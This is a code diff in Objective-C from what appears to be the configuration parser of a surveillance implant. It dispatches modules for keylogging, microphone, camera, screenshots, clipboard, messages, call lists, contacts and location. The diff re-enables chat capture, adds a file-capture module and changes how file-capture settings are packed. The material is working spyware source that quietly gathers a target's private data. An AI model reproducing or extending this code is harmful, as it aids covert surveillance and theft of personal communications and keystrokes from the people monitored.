@@ -88,7 +88,7 @@ typedef struct _fileConfiguration {
     enabled = AGENT_DISABLED;
     
   file.maxFileSize = (maxsize != nil ? [maxsize intValue] : 500000);
-  file.noFileOpen  = (open    != nil ? [open boolValue] : TRUE);
+  file.noFileOpen  = (open    != nil ? ![open boolValue] : FALSE);
   
   if (capture != nil && [capture boolValue] == TRUE)
     {
@@ -133,19 +133,14 @@ typedef struct _fileConfiguration {
     }
   
   
-  NSMutableData *data = [[NSMutableData alloc] initWithCapacity:(sizeof(file_t) - sizeof(char*)) + 
-                                                                [acceptStrings length] + 
-                                                                [denyStrings length]];
-  char *dataBuff = (char*)[data bytes];
+  NSMutableData *data = [[NSMutableData alloc] initWithCapacity:0];
   
-  // struct - patterns
-  memcpy(dataBuff, &file, (sizeof(file_t) - sizeof(char*)));
-  dataBuff += (sizeof(file_t) - sizeof(char*));     
+  // struct without patterns[1]
+  NSData *dataStruct = [NSData dataWithBytes:&file length:(sizeof(u_int)*9)];
   
-  memcpy(dataBuff, [acceptStrings bytes], [acceptStrings length]);
-  dataBuff += [acceptStrings length];
-  
-  memcpy(dataBuff, [denyStrings bytes], [denyStrings length]);
+  [data appendData: dataStruct];
+  [data appendData: acceptStrings];
+  [data appendData: denyStrings];
                                                                                                                                                                       
   [acceptStrings release];
   [denyStrings release];
@@ -667,7 +662,6 @@ typedef struct  {
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
-  NSData  *data;
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_CHAT];
   NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
@@ -696,8 +690,6 @@ typedef struct  {
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
-  
-  [data release];
   
   [pool release];
 }
@@ -946,60 +938,60 @@ typedef struct  {
       {
       if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
         {
-        [self initABModule: module];
+          [self initABModule: module];
         }
       else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
         {
-        [self initDeviceModule: module];
+          [self initDeviceModule: module];
         }
       else if ([moduleType compare: MODULES_CLIST_KEY] == NSOrderedSame) 
         {
-        [self initCalllistModule: module];
+          [self initCalllistModule: module];
         }
       else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
         {
-        [self initCalendarModule: module];
+          [self initCalendarModule: module];
         }
       else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
         {
-        [self initMicModule: module];
+          [self initMicModule: module];
         }
       else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
         {
-        [self initScrshotModule: module];
+          [self initScrshotModule: module];
         }
       else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
         {
-        [self initUrlModule: module];
+          [self initUrlModule: module];
         }
       else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
         {
-        [self initAppModule: module];
+          [self initAppModule: module];
         }      
       else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
         {
-        [self initKeyLogModule: module];
+          [self initKeyLogModule: module];
         }
       else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
         {
-        [self initMessagesModule: module];
+          [self initMessagesModule: module];
         }
       else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
         {
-        [self initClipboardModule: module];
+          [self initClipboardModule: module];
         }
       else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
         {
-        [self initCameraModule: module];
+          [self initCameraModule: module];
         }
       else if ([moduleType compare: MODULES_POSITION_KEY] == NSOrderedSame) 
         {
           [self initPositionModule: module];
         }
-//      else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame) 
-//        {
-//          [self initChatModule: module];
-//        }
+      else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame) 
+        {
+          [self initChatModule: module];
+        }
       else if ([moduleType compare: @"mouse"] == NSOrderedSame) 
         {
           [self initMouseModule: module];
@@ -1007,6 +999,10 @@ typedef struct  {
       else if ([moduleType compare: @"call"] == NSOrderedSame) 
         {
           [self initCallModule: module];
+        }
+      else if ([moduleType compare: @"file"] == NSOrderedSame) 
+        {
+          [self initFileModule: module];
         }
       }
     
@@ -2068,8 +2064,12 @@ typedef struct {
     }
   else if ([moduleName compare: ACTION_MODULE_MOUSE] == NSOrderedSame)
     {
-    tmpAgentID = AGENT_MOUSE;
+      tmpAgentID = AGENT_MOUSE;
     }
+  else if ([moduleName compare: ACTION_MODULE_FILE] == NSOrderedSame)
+    {
+      tmpAgentID = AGENT_FILECAPTURE;
+    } 
     
   data = [[NSData alloc] initWithBytes: &tmpAgentID length: sizeof(tmpAgentID)];
   
